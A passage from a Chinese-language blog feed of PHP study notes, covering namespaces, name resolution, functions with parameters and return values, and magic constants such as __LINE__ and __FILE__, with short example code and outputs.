class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>\<span class="title">Sub</span>\<span class="title">Level</span>;  <span class="comment">//声明分层次的单个命名空间</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">Connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br></pre></td></tr></table></figure><p>类似于目录结构</p><h2 id="命名空间使用"><a href="#命名空间使用" class="headerlink" title="命名空间使用"></a>命名空间使用</h2><p>PHP命名空间中的类名可以通过三种方式引用</p><ul><li><p>非限定名称，或不包含前缀的类名称，例如$a=new foo();或foo::staticmethod();</p></li><li><p>限定名称，或包含前缀的名称，例如$a=new subnamespace\foo();或subnamespace\foo::staticmethod();</p></li><li><p>完全限定名称，或包含了全局前缀操作符的名称，例如,$a=new\currentnamespace\foo();</p></li></ul><p>下面便是三种方式的实例<br>file1.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Foo</span>\<span class="title">Bar</span>\<span class="title">subnamespace</span>; </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> FOO = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">staticmethod</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>file2.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Foo</span>\<span class="title">Bar</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'file1.php'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> FOO = <span class="number">2</span>;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">staticmethod</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">/* 非限定名称 */</span></span></span><br><span class="line"><span class="php">foo(); <span class="comment">// 解析为函数 Foo\Bar\foo</span></span></span><br><span class="line"><span class="php">foo::staticmethod(); <span class="comment">// 解析为类 Foo\Bar\foo ，方法为 staticmethod</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> FOO; <span class="comment">// 解析为常量 Foo\Bar\FOO</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">/* 限定名称 */</span></span></span><br><span class="line"><span class="php">subnamespace\foo(); <span class="comment">// 解析为函数 Foo\Bar\subnamespace\foo</span></span></span><br><span class="line"><span class="php">subnamespace\foo::staticmethod(); <span class="comment">// 解析为类 Foo\Bar\subnamespace\foo,</span></span></span><br><span class="line"><span class="php">                                  <span class="comment">// 以及类的方法 staticmethod</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> subnamespace\FOO; <span class="comment">// 解析为常量 Foo\Bar\subnamespace\FOO</span></span></span><br><span class="line"><span class="php">                                  </span></span><br><span class="line"><span class="php"><span class="comment">/* 完全限定名称 */</span></span></span><br><span class="line"><span class="php">\Foo\Bar\foo(); <span class="comment">// 解析为函数 Foo\Bar\foo</span></span></span><br><span class="line"><span class="php">\Foo\Bar\foo::staticmethod(); <span class="comment">// 解析为类 Foo\Bar\foo, 以及类的方法 staticmethod</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> \Foo\Bar\FOO; <span class="comment">// 解析为常量 Foo\Bar\FOO</span></span></span><br></pre></td></tr></table></figure><br>注意访问任意全局类，函数或常量，都可以使用完全限定名称</p><p>在命名空间内部访问全局类，函数和常量<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Foo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">strlen</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">const</span> INI_ALL = <span class="number">3</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Exception</span> </span>&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = \strlen(<span class="string">'hi'</span>); <span class="comment">// 调用全局函数strlen</span></span></span><br><span class="line"><span class="php">$b = \INI_ALL; <span class="comment">// 访问全局常量 INI_ALL</span></span></span><br><span class="line"><span class="php">$c = <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'error'</span>); <span class="comment">// 实例化全局类 Exception</span></span></span><br></pre></td></tr></table></figure></p><h2 id="命名空间和动态语言特征"><a href="#命名空间和动态语言特征" class="headerlink" title="命名空间和动态语言特征"></a>命名空间和动态语言特征</h2><p>PHP命名空间的实现受到其语言自身的动态特征影响。因此，如果要将下面的代码转换到命名空间中，动态访问元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">classname</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>,<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">funcname</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>,<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">const</span> constname = <span class="string">"global"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="string">'classname'</span>;</span></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> $a; <span class="comment">// prints classname::__construct</span></span></span><br><span class="line"><span class="php">$b = <span class="string">'funcname'</span>;</span></span><br><span class="line"><span class="php">$b(); <span class="comment">// prints funcname</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> constant(<span class="string">'constname'</span>), <span class="string">"\n"</span>; <span class="comment">// prints global</span></span></span><br></pre></td></tr></table></figure><p>必须使用完全限定名称（包括命名空间前缀的类名称）。注意因为在动态的类名称、函数名称或常量名称中，限定名称和完全限定名称没有区别，因此其前导的反斜杠是不必要的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">namespacename</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">classname</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>,<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">funcname</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>,<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">const</span> constname = <span class="string">"namespaced"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'example1.php'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="string">'classname'</span>;</span></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> $a; <span class="comment">// 输出 classname::__construct</span></span></span><br><span class="line"><span class="php">$b = <span class="string">'funcname'</span>;</span></span><br><span class="line"><span class="php">$b(); <span class="comment">// 输出函数名</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> constant(<span class="string">'constname'</span>), <span class="string">"\n"</span>; <span class="comment">// 输出 global</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">/* 如果使用双引号，使用方法为 "\\namespacename\\classname"*/</span></span></span><br><span class="line"><span class="php">$a = <span class="string">'\namespacename\classname'</span>;</span></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> $a; <span class="comment">// 输出 namespacename\classname::__construct</span></span></span><br><span class="line"><span class="php">$a = <span class="string">'namespacename\classname'</span>;</span></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> $a; <span class="comment">// 输出 namespacename\classname::__construct</span></span></span><br><span class="line"><span class="php">$b = <span class="string">'namespacename\funcname'</span>;</span></span><br><span class="line"><span class="php">$b(); <span class="comment">// 输出 namespacename\funcname</span></span></span><br><span class="line"><span class="php">$b = <span class="string">'\namespacename\funcname'</span>;</span></span><br><span class="line"><span class="php">$b(); <span class="comment">// 输出 namespacename\funcname</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> constant(<span class="string">'\namespacename\constname'</span>), <span class="string">"\n"</span>; <span class="comment">// 输出 namespaced</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> constant(<span class="string">'namespacename\constname'</span>), <span class="string">"\n"</span>; <span class="comment">// 输出 namespaced</span></span></span><br></pre></td></tr></table></figure><h2 id="namespace关键字和-NAMESPACE-常量"><a href="#namespace关键字和-NAMESPACE-常量" class="headerlink" title="namespace关键字和_NAMESPACE_常量"></a>namespace关键字和_NAMESPACE_常量</h2><p>PHP支持两种抽象的访问当前命名空间内部元素的方法，<strong>NAMESPACE</strong> 魔术常量和namespace关键字。</p><p>常量<strong>NAMESPACE</strong>的值是包含当前命名空间名称的字符串。在全局的，不包括在任何命名空间中的代码，它包含一个空的字符串。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'"'</span>, <span class="keyword">__NAMESPACE__</span>, <span class="string">'"'</span>; <span class="comment">// 输出 "MyProject"</span></span></span><br></pre></td></tr></table></figure><p>使用_NAMESPACE_动态创建名称<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($classname)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $a = <span class="keyword">__NAMESPACE__</span> . <span class="string">'\\'</span> . $classname;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">new</span> $a;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><h2 id="全局空间"><a href="#全局空间" class="headerlink" title="全局空间"></a>全局空间</h2><p>如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间，与 PHP 引入命名空间概念前一样。在名称前加上前缀 \ 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">A</span>\<span class="title">B</span>\<span class="title">C</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">/* 这个函数是 A\B\C\fopen */</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">fopen</span><span class="params">()</span> </span>&#123; </span></span><br><span class="line"><span class="php">     <span class="comment">/* ... */</span></span></span><br><span class="line"><span class="php">     $f = \fopen(...); <span class="comment">// 调用全局的fopen函数</span></span></span><br><span class="line"><span class="php">     <span class="keyword">return</span> $f;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.命名空间的存在增加了代码的灵活度，可以更好的编写程序</p><p>2.命名空间的使用基本与文件目录相似，都是使用<code>\</code>来进行划分，如果只有一个<code>\</code>那就默认为是全局空间，不加也可以</p><p>3.完全命名空间可以看成是完整的绝对路径，而不完全的基本上可以看成是相对路径</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;命名空间&quot;&gt;&lt;a href=&quot;#命名空间&quot; class=&quot;headerlink&quot; title=&quot;命名空间&quot;&gt;&lt;/a&gt;命名空间&lt;/h1&gt;&lt;p&gt;namespace在C++里见过，use namespace std;&lt;/p&gt;
&lt;p&gt;命名空间可以解决两类问题&lt;/p&gt;
&lt;u
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/8-学习日记</title>
    <link href="http://yoursite.com/2020/07/08/PHP-2020-7-8-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/08/PHP-2020-7-8-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-08T12:03:51.000Z</published>
    <updated>2020-07-08T12:29:37.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="创建PHP函数"><a href="#创建PHP函数" class="headerlink" title="创建PHP函数"></a>创建PHP函数</h2><p>函数是通过调用函数来执行的</p><p>语法<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 要执行的代码</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>PHP函数准则：</p><ul><li>函数的名称应该提示出它的功能</li><li>函数名称以字母或下划线开头，不能以数字开头</li></ul><p>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Kai Jim Refsnes"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My name is "</span>;</span></span><br><span class="line"><span class="php">writeName();</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My <span class="built_in">name</span> <span class="keyword">is</span> Kai Jim Refsnes</span><br></pre></td></tr></table></figure></p><h2 id="添加参数"><a href="#添加参数" class="headerlink" title="添加参数"></a>添加参数</h2><p>为了给函数添加更多的功能，我们可以添加参数，参数类似于变量<br>参数就在函数名称后面的一个括号内指定</p><p>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span><span class="params">($fname)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $fname . <span class="string">" Refsnes.\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Kai Jim"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My sister's name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Hege"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My brother's name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Stale"</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">My name <span class="keyword">is</span> Kai Jim Refsnes.</span><br><span class="line">My siste<span class="string">r's name is Hege Refsnes.</span></span><br><span class="line"><span class="string">My brother'</span>s name <span class="keyword">is</span> Stale Refsnes.</span><br></pre></td></tr></table></figure></p><p>还可以为两个参数<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span><span class="params">($fname,$punctuation)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $fname . <span class="string">" Refsnes"</span> . $punctuation . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Kai Jim"</span>,<span class="string">"."</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My sister's name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Hege"</span>,<span class="string">"!"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My brother's name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Ståle"</span>,<span class="string">"?"</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">My name is Kai Jim Refsnes.</span><br><span class="line">My siste<span class="string">r's name is Hege Refsnes!</span></span><br><span class="line"><span class="string">My brother'</span>s name is Ståle Refsnes?</span><br></pre></td></tr></table></figure></p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>使用return语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($x,$y)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $total=$x+$y;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $total;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"1 + 16 = "</span> . add(<span class="number">1</span>,<span class="number">16</span>);</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>+ <span class="number">16</span> = <span class="number">17</span></span><br></pre></td></tr></table></figure></p><h1 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h1><p>PHP向它运行的任何脚本提供了大量的预定义常量</p><p>还可以通过加载拓展库来实现更多常量</p><p>有八个魔术常量它们的值随着它们在代码中的位置改变而改变</p><h2 id="LINE"><a href="#LINE" class="headerlink" title="_LINE_"></a>_LINE_</h2><p>文件中的当前行号<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'这是第 " '</span>  . <span class="keyword">__LINE__</span> . <span class="string">' " 行'</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是第 <span class="string">" 2 "</span> 行</span><br></pre></td></tr></table></figure></p><h2 id="FILE"><a href="#FILE" class="headerlink" title="_FILE_"></a>_FILE_</h2><p>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名</p><p>从PHP4.0.2后，总是包含一个绝对路径</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'该文件位于 " '</span>  . <span class="keyword">__FILE__</span> . <span class="string">' " '</span>;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该文件位于 " F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default<span class="symbol">\t</span>est1.php "</span><br></pre></td></tr></table></figure></p><h2 id="DIR"><a href="#DIR" class="headerlink" title="_DIR_"></a>_DIR_</h2><p>返回文件所在的目录。如果用在被包括文件中，则返回被包含的文件所在的目录</p><p>等价于dirname(_FILE_)。除非是根目录，否则目录名不包括末尾的斜杠</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'该文件位于 " '</span>  . <span class="keyword">__DIR__</span> . <span class="string">' " '</span>;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该文件位于 " F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default "</span><br></pre></td></tr></table></figure></p><h2 id="FUNCTION"><a href="#FUNCTION" class="headerlink" title="_FUNCTION_"></a>_FUNCTION_</h2><p>返回函数所在的函数名称。自PHP5起本常量返回该函数被定义时的名字(区分大小写)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>  <span class="string">'函数名为：'</span> . <span class="keyword">__FUNCTION__</span> ;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">test();</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名为：<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><h2 id="CLASS"><a href="#CLASS" class="headerlink" title="_CLASS_"></a>_CLASS_</h2><p>返回所在类的名称。自PHP5起本常量返回该类被定义时的名字(区分大小写)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">_print</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'类名为：'</span>  . <span class="keyword">__CLASS__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span>  <span class="string">'函数名为：'</span> . 